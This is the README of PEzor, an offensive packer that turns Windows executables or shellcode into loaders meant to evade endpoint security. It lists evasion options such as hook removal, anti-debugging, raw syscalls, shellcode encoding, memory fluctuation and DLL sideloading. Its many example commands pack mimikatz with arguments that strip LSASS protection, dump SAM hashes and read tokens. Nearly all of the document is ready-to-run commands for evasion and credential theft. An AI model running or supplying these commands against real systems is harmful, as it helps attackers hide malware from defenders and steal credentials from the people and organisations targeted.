PEzor
=====

Read the blog posts here:

- [https://iwantmore.pizza/posts/PEzor.html](https://iwantmore.pizza/posts/PEzor.html)
- [https://iwantmore.pizza/posts/PEzor2.html](https://iwantmore.pizza/posts/PEzor2.html)
- [https://iwantmore.pizza/posts/PEzor3.html](https://iwantmore.pizza/posts/PEzor3.html)
- [https://iwantmore.pizza/posts/PEzor4.html](https://iwantmore.pizza/posts/PEzor4.html)

```raw
 ________________
< PEzor!! v3.3.0 >
 ----------------
      \                    / \  //\
       \    |\___/|      /   \//  \\
            /0  0  \__  /    //  | \ \
           /     /  \/_/    //   |  \  \
           @_^_@'/   \/_   //    |   \   \
           //_^_/     \/_ //     |    \    \
        ( //) |        \///      |     \     \
      ( / /) _|_ /   )  //       |      \     _\
    ( // /) '/,_ _ _/  ( ; -.    |    _ _\.-~        .-~~~^-.
  (( / / )) ,-{        _      `-.|.-~-.           .~         `.
 (( // / ))  '/\      /                 ~-. _ .-~      .-~^-.  \
 (( /// ))      `.   {            }                   /      \  \
  (( / ))     .----~-.\        \-'                 .~         \  `. \^-.
             ///.----..>        \             _ -~             `.  ^-`  ^-_
               ///-._ _ _ _ _ _ _}^ - - - - ~                     ~-- ,.-~
                                                                  /.-~
---------------------------------------------------------------------------
```

<!-- toc -->
* [Installation](#installation)
* [Usage](#usage)
<!-- tocstop -->

<!-- install -->
# Installation
The `install.sh` is designed to work on a Kali Linux distro.
```sh-session
$ git clone https://github.com/phra/PEzor.git
$ cd PEzor
$ sudo bash install.sh
$ bash PEzor.sh -h
```

# ~Upgrading from v2.x.x~

~The `PATH` variable has to be updated to use a specific commit of [Donut](https://github.com/TheWover/donut)! Check the updated `install.sh` script.~

<!-- installstop -->

<!-- usage -->
# Usage
* [`PEzor -h`](#PEzor-help)
* [`PEzor <EXECUTABLE> [donut args...]`](#PEzor-executable)
* [`PEzor <SHELLCODE>`](#PEzor-shellcode)
<!-- usagestop -->

<!-- pezor-help -->
## `PEzor help`

display help for PEzor

```
USAGE
  $ PEzor help
```
<!-- pezor-helpstop -->

<!-- pezor-executable -->
## `PEzor <EXECUTABLE>`

Pack the provided executable into a new one

```
OPTIONS
  -h                        Show usage and exits
  -32                       Force 32-bit executable
  -64                       Force 64-bit executable
  -debug                    Generate a debug build
  -unhook                   User-land hooks removal
  -antidebug                Add anti-debug checks
  -syscalls                 Use raw syscalls [64-bit only] [Windows 10 only]
  -sgn                      Encode the generated shellcode with sgn
  -text                     Store shellcode in .text section instead of .data
  -rx                       Allocate RX memory for shellcode
  -self                     Execute the shellcode in the same thread
  -sdk=VERSION              Use specified .NET Framework version (2, 4, 4.5 (default))
  -cleanup                  Perform the cleanup of allocated payload and loaded modules (only for BOFs)
  -sleep=N                  Sleeps for N seconds before unpacking the shellcode
  -format=FORMAT            Outputs result in specified FORMAT (exe, dll, reflective-dll, service-exe, service-dll, dotnet, dotnet-createsection, dotnet-pinvoke)
  -fluctuate=PROTECTION     Fluctuate memory region to PROTECTION (RW or NA) by hooking Sleep()
  -xorkey=KEY               Encrypt payload with a simple multibyte XOR, it retrieves the key at runtime by using GetComputerNameExA(ComputerNameDnsFullyQualified)
  [donut args...]           After the executable to pack, you can pass additional Donut args, such as -z 2

EXAMPLES
  # 64-bit (self-inject RWX)
  $ PEzor.sh -unhook -antidebug -text -self -sleep=120 mimikatz/x64/mimikatz.exe -z 2
  # 64-bit (self-inject RX)
  $ PEzor.sh -unhook -antidebug -text -self -rx -sleep=120 mimikatz/x64/mimikatz.exe -z 2
  # 64-bit (raw syscalls)
  $ PEzor.sh -sgn -unhook -antidebug -text -syscalls -sleep=120 mimikatz/x64/mimikatz.exe -z 2
  # 64-bit (fluctuate to READWRITE when sleeping)
  $ PEzor.sh -fluctuate=RW -sleep=120 mimikatz/x64/mimikatz.exe -z 2 -p '"coffee" "sleep 5000" "coffee" "exit"'
  # 64-bit (fluctuate to NOACCESS when sleeping)
  $ PEzor.sh -fluctuate=NA -sleep=120 mimikatz/x64/mimikatz.exe -z 2 -p '"coffee" "sleep 5000" "coffee" "exit"'
  # 64-bit (use environmental keying with GetComputerNameExA)
  $ PEzor.sh -xorkey=MY-FQDN-COMPUTER-NAME -sleep=120 mimikatz/x64/mimikatz.exe -z 2 -p '"coffee" "sleep 5000" "coffee" "exit"'
  # 64-bit (support EXEs with resources by keeping PE headers in memory)
  $ PEzor.sh -sleep=120 mimikatz/x64/mimikatz.exe -z 2 -k 2 -p '"!+" "!processprotect" "/process:lsass.exe" "/remove" "!-" "exit"'
  # 64-bit (beacon object file)
  $ PEzor.sh -format=bof mimikatz/x64/mimikatz.exe -z 2 -p '"log c:\users\public\mimi.out" "token::whoami" "exit"'
  # 64-bit (beacon object file w/ cleanup)
  $ PEzor.sh -format=bof -cleanup mimikatz/x64/mimikatz.exe -z 2 -p '"log c:\users\public\mimi.out" "token::whoami" "exit"'
  # 64-bit (dll)
  $ PEzor.sh -format=dll mimikatz/x64/mimikatz.exe -z 2 -p '\"log c:\users\public\mimi.out\" \"token::whoami\" \"exit\"'
  # 64-bit (dll sideload)
  $ PEzor.sh -format=dll -dll-sideload=version.dll mimikatz/x64/mimikatz.exe -z 2 -p '\"log c:\users\public\mimi.out\" \"token::whoami\" \"exit\"'
  # 64-bit (reflective dll)
  $ PEzor.sh -format=reflective-dll mimikatz/x64/mimikatz.exe -z 2 -p '"log c:\users\public\mimi.out" "token::whoami" "exit"'
  # 64-bit (service exe)
  $ PEzor.sh -format=service-exe mimikatz/x64/mimikatz.exe -z 2 -p '"log c:\users\public\mimi.out" "token::whoami" "exit"'
  # 64-bit (service dll)
  $ PEzor.sh -format=service-dll mimikatz/x64/mimikatz.exe -z 2 -p '"log c:\users\public\mimi.out" "token::whoami" "exit"'
  # 64-bit (dotnet)
  $ PEzor.sh -format=dotnet -sleep=120 mimikatz/x64/mimikatz.exe -z 2 -p '"log c:\users\public\mimi.out" "token::whoami" "exit"'
  # 64-bit (dotnet-pinvoke)
  $ PEzor.sh -format=dotnet-pinvoke -sleep=120 mimikatz/x64/mimikatz.exe -z 2 -p '"log c:\users\public\mimi.out" "token::whoami" "exit"'
  # 64-bit (dotnet-createsection)
  $ PEzor.sh -format=dotnet-createsection -sleep=120 mimikatz/x64/mimikatz.exe -z 2 -p '"log c:\users\public\mimi.out" "token::whoami" "exit"'
  # 32-bit (self-inject)
  $ PEzor.sh -unhook -antidebug -text -self -sleep=120 mimikatz/Win32/mimikatz.exe -z 2
  # 32-bit (Win32 API: VirtualAlloc/WriteProcessMemory/CreateRemoteThread)
  $ PEzor.sh -sgn -unhook -antidebug -text -sleep=120 mimikatz/Win32/mimikatz.exe -z 2
  # 32-bit (Win32 API: VirtualAlloc/WriteProcessMemory/CreateRemoteThread) and arguments for donut
  $ PEzor.sh -sgn -unhook -antidebug -text -sleep=120 mimikatz/Win32/mimikatz.exe -z 2 "-plsadump::sam /system:SystemBkup.hiv /sam:SamBkup.hiv"
```
<!-- pezor-executablestop -->

<!-- pezor-shellcode -->
## `PEzor <SHELLCODE>`

Pack the provided shellcode into an executable

```
USAGE
  $ PEzor <-32|-64> [options...] <SHELLCODE>

OPTIONS
  -h                        Show usage and exits
  -32                       Force 32-bit executable
  -64                       Force 64-bit executable
  -debug                    Generate a debug build
  -unhook                   User-land hooks removal
  -antidebug                Add anti-debug checks
  -shellcode                Force shellcode detection
  -syscalls                 Use raw syscalls [64-bit only] [Windows 10 only]
  -sgn                      Encode the provided shellcode with sgn
  -text                     Store shellcode in .text section instead of .data
  -rx                       Allocate RX memory for shellcode
  -self                     Execute the shellcode in the same thread [requires RX shellcode, not compatible with -sgn]
  -cleanup                  Perform the cleanup of allocated payload and loaded modules (only for BOFs)
  -sleep=N                  Sleeps for N seconds before unpacking the shellcode
  -format=FORMAT            Outputs result in specified FORMAT (exe, dll, reflective-dll, service-exe, service-dll, dotnet, dotnet-createsection, dotnet-pinvoke)
  -fluctuate=PROTECTION     Fluctuate memory region to PROTECTION (RW or NA) by hooking Sleep()
  -xorkey=KEY               Encrypt payload with a simple multibyte XOR, it retrieves the key at runtime by using GetComputerNameExA(ComputerNameDnsFullyQualified)

EXAMPLES
  # 64-bit (self-inject RWX)
  $ PEzor.sh shellcode.bin
  # 64-bit (self-inject RX)
  $ PEzor.sh -unhook -antidebug -text -self -rx -sleep=120 shellcode.bin
  # 64-bit (self-inject)
  $ PEzor.sh -unhook -antidebug -text -self -sleep=120 shellcode.bin
  # 64-bit (raw syscalls)
  $ PEzor.sh -sgn -unhook -antidebug -text -syscalls -sleep=120 shellcode.bin
  # 64-bit (fluctuate to READWRITE when sleeping)
  $ PEzor.sh -fluctuate=RW shellcode.bin
  # 64-bit (fluctuate to NOACCESS when sleeping)
  $ PEzor.sh -fluctuate=NA shellcode.bin
  # 64-bit (use environmental keying with GetComputerNameExA)
  $ PEzor.sh -xorkey=MY-FQDN-MACHINE-NAME shellcode.bin
  # 64-bit (beacon object file)
  $ PEzor.sh -format=bof shellcode.bin
  # 64-bit (beacon object file w/ cleanup)
  $ PEzor.sh -format=bof -cleanup shellcode.bin
  # 64-bit (dll)
  $ PEzor.sh -format=dll shellcode.bin
  # 64-bit (dll sideload)
  $ PEzor.sh -format=dll -dll-sideload=version.dll shellcode.bin
  # 64-bit (reflective dll)
  $ PEzor.sh -format=reflective-dll shellcode.bin
  # 64-bit (service exe)
  $ PEzor.sh -format=service-exe shellcode.bin
  # 64-bit (service dll)
  $ PEzor.sh -format=service-dll shellcode.bin
  # 64-bit (dotnet)
  $ PEzor.sh -format=dotnet shellcode.bin
  # 64-bit (dotnet-pinvoke)
  $ PEzor.sh -format=dotnet-pinvoke shellcode.bin
  # 64-bit (dotnet-createsection)
  $ PEzor.sh -format=dotnet-createsection shellcode.bin
  # 32-bit (self-inject)
  $ PEzor.sh -unhook -antidebug -text -self -sleep=120 shellcode.bin
  # 32-bit (Win32 API: VirtualAlloc/WriteProcessMemory/CreateRemoteThread)
  $ PEzor.sh -sgn -unhook -antidebug -text -sleep=120 shellcode.bin
```

_See code: [PEzor.sh](https://github.com/phra/PEzor/blob/master/PEzor.sh)_
<!-- pezor-shellcodestop -->
